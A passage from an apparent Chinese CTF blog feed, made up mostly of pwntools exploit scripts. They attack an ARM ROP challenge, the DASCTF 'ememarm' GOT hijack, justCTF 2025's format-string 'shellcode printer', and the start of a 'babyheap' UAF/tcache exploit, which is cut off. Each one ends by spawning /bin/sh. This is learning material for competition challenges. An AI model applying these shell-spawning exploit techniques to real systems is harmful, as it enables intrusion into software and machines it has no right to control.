class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture aarch64&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file baby_arm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x400838&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.execve(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x4007e0</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">csu=<span class="number">0x4008cc</span></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gadget</span>(<span class="params">tar_funk,x0,x1,x2</span>):</span><br><span class="line">    payload=p64(<span class="number">0</span>)+p64(<span class="number">0x4008ac</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(tar_funk)+p64(x2)+p64(x1)+p64(x0)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;qemu-aarch64&quot;</span>,  <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;pwn&quot;</span>])</span><br><span class="line"><span class="comment">#p=remote(&#x27;121.199.64.23&#x27;,51603)</span></span><br><span class="line"><span class="comment">#ggg()</span></span><br><span class="line">ru(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;taotao&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">bss=<span class="number">0x411000</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(csu)+gadget(read_got,<span class="number">0</span>,bss+<span class="number">0x200</span>,<span class="number">0x200</span>)+gadget(bss+<span class="number">0x200</span>+<span class="number">0x40</span>,bss,<span class="number">0x1000</span>,<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(bss+<span class="number">0x200</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">pause()</span><br><span class="line">s(shellcode)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h4 id="2021-DASCTF-1月赛-ememarm"><a href="#2021-DASCTF-1月赛-ememarm" class="headerlink" title="2021 DASCTF 1月赛 ememarm"></a>2021 DASCTF 1月赛 ememarm</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;aarch64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>, <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;-&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture aarch64&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file pwn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x400c68&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">requ</span>(<span class="params">cx,cy,is_</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;you choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;cx:&#x27;</span>,cx)</span><br><span class="line">    sa(<span class="string">b&#x27;cy:&#x27;</span>,cy)</span><br><span class="line">    sla(<span class="string">b&#x27;do you want delete?&#x27;</span>,<span class="built_in">str</span>(is_).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;you choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">max</span>(<span class="params">cx,cy,is_</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;you choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;cx:&#x27;</span>,cx)</span><br><span class="line">    sa(<span class="string">b&#x27;cy:&#x27;</span>,cy)</span><br><span class="line">    sla(<span class="string">b&#x27;do you want delete?&#x27;</span>,<span class="built_in">str</span>(is_).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;you choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    pause()</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;pwn&quot;</span>])</span><br><span class="line"><span class="comment"># p = process([&quot;qemu-aarch64&quot;,&quot;-L&quot;, &quot;./&quot;, &quot;-g&quot;,&quot;1234&quot;, &quot;pwn&quot;])</span></span><br><span class="line"><span class="comment"># ggg()</span></span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">requ(<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x8</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>,<span class="number">0</span>)</span><br><span class="line">requ(<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x8</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>,<span class="number">0</span>)</span><br><span class="line">requ(p64(<span class="number">0</span>),p64(<span class="number">0x31</span>),<span class="number">1</span>)</span><br><span class="line">requ(<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x8</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>))</span><br><span class="line">requ(p64(<span class="number">0</span>),p64(elf.got[<span class="string">&#x27;printf&#x27;</span>]),<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">requ(p64(<span class="number">0</span>),p64(elf.got[<span class="string">&#x27;free&#x27;</span>]),<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x63f40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,binsh=getshell()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">sla(<span class="string">b&#x27;you choice: &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>最近做习惯了打IO用FSOP的堆体，上述两个堆题劫持got表的题都不太会做了，特别是ememarm，看着exp很短，细究起来对于数据的构造还是很巧妙的，强烈推荐（）~~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ARM-PWN学习&quot;&gt;&lt;a href=&quot;#ARM-PWN学习&quot; class=&quot;headerlink&quot; title=&quot;ARM-PWN学习&quot;&gt;&lt;/a&gt;ARM-PWN学习&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://gggtaotao.github.io/tags/pwn/"/>
    
    <category term="arm" scheme="https://gggtaotao.github.io/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>justctf2025 pwn</title>
    <link href="https://gggtaotao.github.io/2025/08/07/justctf2025-pwn/"/>
    <id>https://gggtaotao.github.io/2025/08/07/justctf2025-pwn/</id>
    <published>2025-08-07T13:42:17.000Z</published>
    <updated>2025-08-07T14:02:14.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="justctf2025-pwn"><a href="#justctf2025-pwn" class="headerlink" title="justctf2025 pwn"></a>justctf2025 pwn</h1><pre><code> 上周打了一下justctf，做了一道babyheap，shellcode没想到jmp短跳指令，没做出来，prospector和jctfcoin是学长做的就没看，QAQ，今天看了一下，还可以## shellcode printer</code></pre><p>利用printf的%hn，每次两个字节向mmap中写shellcode，最后可以执行两个字节的shellcode，利用jmp的短跳指令可以直接跳回一开始的shellcode，就可以getshell了</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        movabs rdi, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">        push   rdi</span></span><br><span class="line"><span class="string">        lea rdi,[rsp]</span></span><br><span class="line"><span class="string">        xor rsi,rsi</span></span><br><span class="line"><span class="string">        xor rdx,rdx</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        add rax,59</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p=process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">    <span class="comment"># p=remote(&#x27;shellcode-printer.nc.jctf.pro&#x27;,1337)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">2</span>):</span><br><span class="line">        <span class="comment"># 提取两字节，如果是最后一个且长度为奇数则只取一个字节</span></span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(shellcode):</span><br><span class="line">            two_bytes = shellcode[i] | (shellcode[i+<span class="number">1</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            two_bytes = shellcode[i]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算需要填充的字符数</span></span><br><span class="line">        padding = two_bytes</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造格式字符串，%6$hn表示写入到第6个参数指向的地址</span></span><br><span class="line">        fmt_str = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(padding).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line">        ru(<span class="string">b&#x27;Enter a format string: &#x27;</span>)</span><br><span class="line">        sl(fmt_str)</span><br><span class="line"></span><br><span class="line">    fmt_str = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xe0eb</span>).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line">    ggg()</span><br><span class="line">    ru(<span class="string">b&#x27;Enter a format string: &#x27;</span>)</span><br><span class="line">    sl(fmt_str)</span><br><span class="line">    ru(<span class="string">b&#x27;Enter a format string: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    shell()</span><br></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>很明显的free掉chunk后指针没有清零，可以uaf，难点在于怎么泄露libc，利用tcache任意地址分配chunk，打tcache的结构体，使得堆管理机制认为0x100的chunk已经把tcachebin填满了，然后堆叠伪造一个0x100的chunk，free掉这个chunk就会进入到unstorebin了，然后就可以泄露libc了，之后就是FSOP，没什么好说的了</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index? &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    ru(<span class="string">&#x27;Content? Content? &#x27;</span>)</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index? &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index? &#x27;</span>)</span><br><span class="line">    